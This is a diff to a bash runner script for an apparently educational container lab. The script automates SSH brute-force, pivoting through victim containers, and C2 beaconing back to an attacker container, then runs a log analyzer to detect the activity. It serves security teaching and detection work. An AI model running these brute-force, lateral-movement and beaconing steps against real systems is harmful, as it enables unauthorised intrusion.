@@ -27,10 +27,15 @@ banner() {
 }
 
 # ── Validate input ─────────────────────────────────────────────────────────────
-if [[ "$SCENARIO" -lt 1 || "$SCENARIO" -gt 4 ]] 2>/dev/null; then
+if ! [[ "$SCENARIO" =~ ^[1-4]$ ]]; then
     fail "Invalid scenario. Usage: ./auto_run.sh [1|2|3|4]"
     exit 1
 fi
+
+# ── Must run from the lab root directory ───────────────────────────────────────
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+cd "$SCRIPT_DIR"
+log "Working directory: $SCRIPT_DIR"
 
 # ── Runtime detection ──────────────────────────────────────────────────────────
 if command -v podman &>/dev/null; then
@@ -42,6 +47,21 @@ else
 fi
 log "Runtime: $RT"
 
+# ── Compose wrapper ────────────────────────────────────────────────────────────
+# --project-directory . fixes "path not found" errors — build contexts like
+# ./victim, ./victim-b, ./attacker are resolved from the lab root, not from
+# the scenarios/ subdirectory where the yml lives.
+compose_cmd() {
+    local yml="$1"; shift
+    $RT compose --project-directory "$SCRIPT_DIR" -f "$yml" "$@"
+}
+
+compose_down_all() {
+    for yml in scenarios/scenario{1,2,3,4}.yml; do
+        [[ -f "$yml" ]] && compose_cmd "$yml" down 2>/dev/null || true
+    done
+}
+
 # ── Network constants ──────────────────────────────────────────────────────────
 ATTACKER=172.21.0.10
 VICTIM1_EXT=172.21.0.20
@@ -51,8 +71,8 @@ VICTIM1_INT=10.10.0.20
 VICTIM3_INT=10.10.0.10
 HONEYPOT_INT=10.10.0.50
 
-VICTIM4_DEEP=10.20.0.10    # deep_net — scenario 3 (parallel pivot) + scenario 4 (2nd hop)
-VICTIM5_DEEP=10.20.0.11    # deep_net — scenario 3 second parallel target
+VICTIM4_DEEP=10.20.0.10
+VICTIM5_DEEP=10.20.0.11
 
 # Background PIDs to clean up on exit
 BG_PIDS=()
@@ -64,14 +84,18 @@ cleanup() {
 trap cleanup EXIT
 
 # ── Helpers ────────────────────────────────────────────────────────────────────
+image_exists() {
+    $RT image inspect "$1" &>/dev/null
+}
+
 wait_for_container() {
     local name=$1
-    local max=30 i=0
+    local max=40 i=0
     log "Waiting for $name..."
     while ! $RT exec "$name" echo ok &>/dev/null; do
-        sleep 2; ((i++))
+        sleep 3; ((i++))
         if [[ $i -ge $max ]]; then
-            warn "$name did not respond in time — continuing anyway"
+            warn "$name did not respond — continuing anyway"
             return 0
         fi
     done
@@ -81,12 +105,52 @@ wait_for_container() {
 wait_for_ssh() {
     local via=$1 target=$2
     local max=20 i=0
-    log "Waiting for SSH on $target..."
+    log "Waiting for SSH on $target (via $via)..."
     while ! $RT exec "$via" bash -c "nc -z -w2 $target 22" &>/dev/null; do
-        sleep 2; ((i++))
-        [[ $i -ge $max ]] && { warn "SSH on $target may not be ready yet"; return 0; }
+        sleep 3; ((i++))
+        [[ $i -ge $max ]] && { warn "SSH on $target not responding — continuing"; return 0; }
     done
     ok "SSH $target is up"
+}
+
+# =============================================================================
+# PREFLIGHT — Pull base images while internet is available
+# =============================================================================
+phase_preflight() {
+    banner "PREFLIGHT — Base Image Check"
+
+    # The Dockerfiles all use ubuntu:22.04. It must be in the local cache
+    # before compose runs, because the lab networks have no internet access.
+
+    local base_image="ubuntu:22.04"
+
+    if image_exists "$base_image"; then
+        ok "Base image $base_image already in local cache — no pull needed"
+        return 0
+    fi
+
+    log "Base image $base_image not found locally — attempting pull..."
+    log "(This requires internet access and only needs to happen once)"
+
+    if $RT pull "$base_image"; then
+        ok "Pulled $base_image successfully"
+    else
+        echo ""
+        fail "════════════════════════════════════════════════════"
+        fail "Cannot pull $base_image from Docker Hub."
+        fail ""
+        fail "This means one of:"
+        fail "  1. No internet connection on this machine"
+        fail "  2. Docker/Podman DNS is not resolving registry-1.docker.io"
+        fail ""
+        fail "Fix: connect to the internet and run:"
+        fail "  $RT pull ubuntu:22.04"
+        fail ""
+        fail "Then re-run this script. The image is cached after the"
+        fail "first pull — you will not need internet again."
+        fail "════════════════════════════════════════════════════"
+        exit 1
+    fi
 }
 
 # =============================================================================
@@ -95,35 +159,72 @@ wait_for_ssh() {
 phase_setup() {
     banner "PHASE 0 — Starting Scenario $SCENARIO"
 
-    log "Stopping any running containers..."
-    $RT compose down 2>/dev/null || true
-
     local yml="scenarios/scenario${SCENARIO}.yml"
     if [[ ! -f "$yml" ]]; then
-        fail "Compose file not found: $yml"; exit 1
+        fail "Compose file not found: $yml"
+        fail "Make sure you are running this script from the lab root directory."
+        exit 1
     fi
 
-    log "Launching $yml..."
-    $RT compose -f "$yml" up -d --build
+    log "Stopping any running containers..."
+    compose_down_all
+    sleep 3
 
-    # Wait for containers that always exist
+    # ── Build services ONE AT A TIME ───────────────────────────────────────────
+    # Building all services in parallel (the default) causes OOM kills (exit
+    # status 9 / SIGKILL from the OOM killer) when several heavy Dockerfiles
+    # run simultaneously. Building sequentially costs a bit more time but is
+    # reliable on machines with limited RAM.
+    log "Discovering services in $yml..."
+    local services
+    services=$(compose_cmd "$yml" config --services 2>/dev/null)
+    if [[ -z "$services" ]]; then
+        fail "Could not read service list from $yml — check the file is valid YAML"
+        exit 1
+    fi
+
+    log "Building services one at a time (avoids OOM on parallel builds)..."
+    for svc in $services; do
+        log "  Building: $svc"
+        compose_cmd "$yml" build "$svc"
+        local rc=$?
+        if [[ $rc -ne 0 ]]; then
+            fail "Build failed for service '$svc' (exit $rc)"
+            fail "Run this to see the full error:"
+            fail "  $RT compose --project-directory . -f $yml build $svc"
+            exit 1
+        fi
+        ok "  $svc built"
+    done
+
+    log "Starting all containers..."
+    compose_cmd "$yml" up -d
+    local rc=$?
+    if [[ $rc -ne 0 ]]; then
+        fail "Compose up failed (exit $rc)"
+        compose_cmd "$yml" logs --tail=40 2>/dev/null || true
+        exit 1
+    fi
+
+    log "Waiting 12s for containers and sshd to initialise..."
+    sleep 12
+
     for c in attacker victim1 victim2 monitor; do
         wait_for_container "$c"
     done
 
-    # Scenario-specific containers
     if [[ $SCENARIO -ge 2 ]]; then
         wait_for_container victim3
         wait_for_container honeypot
     fi
     if [[ $SCENARIO -ge 3 ]]; then
-        wait_for_container victim4 2>/dev/null || true
-        wait_for_container victim5 2>/dev/null || true
+        wait_for_container victim4 || warn "victim4 not found — check name in scenario${SCENARIO}.yml"
+        wait_for_container victim5 || warn "victim5 not found — check name in scenario${SCENARIO}.yml"
     fi
 
-    log "Giving sshd 6 seconds to fully start..."
-    sleep 6
-    ok "Scenario $SCENARIO is up and ready"
+    log "Giving sshd 8 more seconds to fully settle..."
+    sleep 8
+    ok "Scenario $SCENARIO is up"
 }
 
 # =============================================================================
@@ -131,7 +232,6 @@ phase_setup() {
 # =============================================================================
 phase_recon() {
     banner "PHASE 1 — Reconnaissance"
-
     log "Scanning attack_net (172.21.0.x)..."
     $RT exec attacker python3 /lab/simulator.py scan --network 172.21.0. 2>&1 \
         | tee /tmp/scan_attack.txt
@@ -146,15 +246,14 @@ phase_recon() {
 # =============================================================================
 phase_bruteforce() {
     banner "PHASE 2 — SSH Brute-Force (attack_net)"
-
     log "Attacking victim1 ($VICTIM1_EXT) and victim2 ($VICTIM2_EXT) in parallel..."
 
     $RT exec attacker python3 /lab/simulator.py bruteforce \
-        --target "$VICTIM1_EXT" --delay 0.5 --max-attempts 150 &
+        --target "$VICTIM1_EXT" --delay 0.8 --max-attempts 150 &
     BG_PIDS+=($!)
 
     $RT exec attacker python3 /lab/simulator.py bruteforce \
-        --target "$VICTIM2_EXT" --delay 0.5 --max-attempts 150 &
+        --target "$VICTIM2_EXT" --delay 0.8 --max-attempts 150 &
     BG_PIDS+=($!)
 
     log "Waiting for both jobs..."
@@ -164,7 +263,7 @@ phase_bruteforce() {
 }
 
 # =============================================================================
-# PHASE 3 — Prepare victim1 as pivot (copy paramiko + simulator)
+# PHASE 3 — Prepare victim1 as pivot
 # =============================================================================
 phase_prepare_pivot() {
     banner "PHASE 3 — Preparing victim1 as Pivot"
@@ -188,19 +287,16 @@ phase_prepare_pivot() {
     $RT exec victim1 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true"
     $RT exec victim1 ldconfig 2>/dev/null || true
 
-    log "Copying simulator to victim1 (with all credential sets)..."
-    $RT cp attacker:/lab/simulator.py /tmp/sim.py
-    python3 -c "
-import re, sys
-c = open('/tmp/sim.py').read()
-# Inject all credential sets if not already present
-for cred in ['internal123', 'service1', 'deepnet123']:
-    if cred not in c:
-        c = re.sub(r'(\"pass1234\")', r'\1, \"' + cred + '\"', c, count=1)
-open('/tmp/sim.py','w').write(c)
-print('Credentials patched')
-" 2>&1 || warn "Could not patch simulator credentials — lateral may miss some"
-    $RT cp /tmp/sim.py victim1:/tmp/sim.py
+    # Use the fixed simulator.py from the lab source tree if present,
+    # otherwise fall back to the copy inside the running attacker container
+    if [[ -f "$SCRIPT_DIR/attacker/simulator.py" ]]; then
+        $RT cp "$SCRIPT_DIR/attacker/simulator.py" victim1:/tmp/sim.py
+        log "Copied simulator.py from attacker/ source"
+    else
+        $RT cp attacker:/lab/simulator.py /tmp/sim.py
+        $RT cp /tmp/sim.py victim1:/tmp/sim.py
+        log "Copied simulator.py from running attacker container"
+    fi
 
     if $RT exec victim1 python3 -c "import paramiko; print('paramiko ok')" 2>/dev/null; then
         ok "victim1 pivot ready"
@@ -217,53 +313,57 @@ phase_lateral() {
 
     wait_for_ssh victim1 "$VICTIM3_INT"
 
+    # Cooldown after brute-force load so sshd on victim3 isn't throttling
+    log "Pausing 5s (sshd cooldown before lateral)..."
+    sleep 5
+
     log "Brute-forcing victim3 ($VICTIM3_INT) FROM victim1..."
     $RT exec victim1 python3 /tmp/sim.py bruteforce \
-        --target "$VICTIM3_INT" --delay 0.5 --max-attempts 120
+        --target "$VICTIM3_INT" --delay 1.0 --max-attempts 120
     ok "Lateral to victim3 complete"
 
     log "Triggering honeypot ($HONEYPOT_INT) FROM victim1..."
     $RT exec victim1 python3 /tmp/sim.py bruteforce \
-        --target "$HONEYPOT_INT" --delay 0.5 --max-attempts 60 || \
-        warn "Honeypot phase returned non-zero (may be normal)"
+        --target "$HONEYPOT_INT" --delay 1.0 --max-attempts 60 || \
+        warn "Honeypot brute-force returned non-zero (may be normal)"
     ok "Honeypot triggered"
 }
 
 # =============================================================================
-# PHASE 4b — Deep Lateral Movement → deep_net (scenarios 3 & 4 only)
+# PHASE 4b — Deep Lateral → deep_net  (scenarios 3 & 4 only)
 # =============================================================================
 phase_lateral_deep() {
     banner "PHASE 4b — Deep Lateral Movement (deep_net 10.20.0.x)"
 
-    # Copy packages to victim3 so it can be a second pivot (scenario 4)
     log "Preparing victim3 as second pivot..."
     $RT cp /tmp/pkgs.tar.gz victim3:/tmp/pkgs.tar.gz 2>/dev/null && \
         $RT exec victim3 bash -c "cd / && tar xzf /tmp/pkgs.tar.gz 2>/dev/null || true" || \
         warn "Could not copy packages to victim3"
     $RT cp /tmp/libs.tar.gz victim3:/tmp/libs.tar.gz 2>/dev/null && \
-        $RT exec victim3 bash -c "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true; ldconfig 2>/dev/null || true" || true
-    $RT cp /tmp/sim.py victim3:/tmp/sim.py 2>/dev/null || warn "Could not copy sim.py to victim3"
+        $RT exec victim3 bash -c \
+            "cd / && tar xzf /tmp/libs.tar.gz 2>/dev/null || true; ldconfig 2>/dev/null || true" || true
+    $RT cp victim1:/tmp/sim.py /tmp/sim_v1.py 2>/dev/null && \
+        $RT cp /tmp/sim_v1.py victim3:/tmp/sim.py 2>/dev/null || \
+        warn "Could not copy sim.py to victim3"
 
     if [[ "$SCENARIO" == "3" ]]; then
-        # Two PARALLEL pivots: victim1 reaches both internal_net AND deep_net
         log "Scenario 3 — victim1 → victim4 ($VICTIM4_DEEP) and victim5 ($VICTIM5_DEEP) in parallel..."
         $RT exec victim1 python3 /tmp/sim.py bruteforce \
-            --target "$VICTIM4_DEEP" --delay 0.5 --max-attempts 120 &
+            --target "$VICTIM4_DEEP" --delay 1.0 --max-attempts 120 &
         BG_PIDS+=($!)
         $RT exec victim1 python3 /tmp/sim.py bruteforce \
-            --target "$VICTIM5_DEEP" --delay 0.5 --max-attempts 120 &
+            --target "$VICTIM5_DEEP" --delay 1.0 --max-attempts 120 &
         BG_PIDS+=($!)
         wait "${BG_PIDS[@]}" 2>/dev/null || true
         BG_PIDS=()
         ok "Parallel deep lateral complete"
 
     elif [[ "$SCENARIO" == "4" ]]; then
-        # 2-hop chain: attacker → victim1 → victim3 → victim4
         log "Scenario 4 — victim3 → victim4 ($VICTIM4_DEEP) (2-hop chain)..."
         $RT exec victim3 python3 /tmp/sim.py bruteforce \
-            --target "$VICTIM4_DEEP" --delay 0.5 --max-attempts 120 || \
-            warn "Deep lateral from victim3 failed — check victim3 has paramiko and sim.py"
-        ok "2-hop deep lateral complete: attacker → victim1 → victim3 → victim4"
+            --target "$VICTIM4_DEEP" --delay 1.0 --max-attempts 120 || \
+            warn "Deep lateral from victim3 failed — verify victim3 has paramiko and sim.py"
+        ok "2-hop chain complete: attacker → victim1 → victim3 → victim4"
     fi
 }
 
@@ -273,7 +373,6 @@ phase_lateral_deep() {
 phase_c2() {
     banner "PHASE 5 — C2 Beaconing"
 
-    # ── C2 listener on attacker ────────────────────────────────────────────────
     log "Starting C2 listener on attacker (port 8888)..."
     $RT exec attacker python3 -c "
 import socket
@@ -301,7 +400,6 @@ print('[C2] Listener closed')
     BG_PIDS+=($C2_PID)
     sleep 2
 
-    # ── Beacons from victim1 → attacker ───────────────────────────────────────
     log "victim1 → attacker ($ATTACKER:8888) — 5 beacons..."
     $RT exec victim1 python3 -c "
 import socket, time, json
@@ -321,8 +419,7 @@ for i in range(5):
 "
 
     if [[ $SCENARIO -ge 2 ]]; then
-        # ── Relay listener on victim1 for victim3 ─────────────────────────────
-        log "Starting C2 relay on victim1 (port 8889) for victim3..."
+        log "Starting C2 relay on victim1:8889 for victim3..."
         $RT exec victim1 python3 -c "
 import socket
 srv = socket.socket()
@@ -349,7 +446,6 @@ print('[C2-relay] Done')
         BG_PIDS+=($RELAY_PID)
         sleep 2
 
-        # ── Beacons from victim3 → victim1 relay ──────────────────────────────
         log "victim3 → victim1 relay ($VICTIM1_INT:8889) — 5 beacons..."
         $RT exec victim3 python3 -c "
 import socket, time, json
@@ -364,10 +460,10 @@ for i in range(5):
     except Exception as e:
         print(f'Beacon {i+1} failed: {e}', flush=True)
     time.sleep(2)
-" || warn "victim3 beaconing failed — check relay is reachable"
+" || warn "victim3 beaconing failed"
     fi
 
-    log "Waiting for C2 listener to finish (up to 45s timeout)..."
+    log "Waiting for C2 listener to finish..."
     wait $C2_PID 2>/dev/null || true
     BG_PIDS=()
     ok "C2 beaconing phase complete"
@@ -395,9 +491,10 @@ phase_detect() {
     local lines
     lines=$(wc -l < /tmp/a.log 2>/dev/null || echo 0)
     log "Total log lines collected: $lines"
+    [[ "$lines" -lt 5 ]] && warn "Very few log lines — sshd may not have written yet"
 
     $RT cp /tmp/a.log monitor:/var/log/lab/auth.log
-    ok "Logs copied to monitor"
+    ok "Logs copied to monitor:/var/log/lab/auth.log"
 
     log "Running analyzer..."
     $RT exec monitor python3 /lab/monitor/analyzer.py --report
@@ -410,28 +507,28 @@ phase_detect() {
 print_summary() {
     banner "ALL DONE — Scenario $SCENARIO"
     echo -e "${GREEN}Phases completed:${RESET}"
-    echo "  0   Lab startup (scenario${SCENARIO}.yml)"
-    echo "  1   Reconnaissance scan — attack_net"
-    echo "  2   SSH brute-force — victim1 + victim2 (parallel)"
+    echo "  PRE  Base image check / pull"
+    echo "  0    Lab startup — scenario${SCENARIO}.yml"
+    echo "  1    Reconnaissance — attack_net scan"
+    echo "  2    SSH brute-force — victim1 + victim2 (parallel, delay 0.8s)"
     if [[ $SCENARIO -ge 2 ]]; then
-        echo "  3   Pivot preparation on victim1"
-        echo "  4   Lateral movement — internal_net (victim3, honeypot)"
+        echo "  3    Pivot preparation on victim1"
+        echo "  4    Lateral movement — internal_net (victim3, honeypot, delay 1.0s)"
     fi
     if [[ $SCENARIO -ge 3 ]]; then
-        [[ "$SCENARIO" == "3" ]] && echo "  4b  Deep lateral — deep_net (victim4 + victim5, parallel pivots)"
-        [[ "$SCENARIO" == "4" ]] && echo "  4b  Deep lateral — deep_net (victim3 → victim4, 2-hop chain)"
+        [[ "$SCENARIO" == "3" ]] && echo "  4b   Deep lateral — deep_net parallel pivots (victim4 + victim5)"
+        [[ "$SCENARIO" == "4" ]] && echo "  4b   Deep lateral — 2-hop chain (victim3 → victim4)"
     fi
-    echo "  5   C2 beaconing"
-    echo "  7   Log collection + analyzer report"
+    echo "  5    C2 beaconing"
+    echo "  7    Log collection + analyzer report"
     echo ""
     echo -e "${CYAN}Useful follow-up:${RESET}"
     echo "  $RT exec -it monitor  python3 /lab/monitor/analyzer.py --rules"
     echo "  $RT exec -it victim1  bash"
     echo "  $RT exec -it attacker bash"
     echo "  $RT exec -it honeypot cat /var/log/lab/honeypot_events.jsonl"
-    echo "  $RT compose down"
     echo ""
-    echo -e "Finished at: $(date)"
+    echo "Finished at: $(date)"
 }
 
 # =============================================================================
@@ -440,6 +537,7 @@ print_summary() {
 banner "FEUP SSR — Auto Scenario Runner — Scenario $SCENARIO"
 log "Start: $(date)"
 
+phase_preflight    # ← pull ubuntu:22.04 if not cached — must have internet once
 phase_setup
 phase_recon
 phase_bruteforce
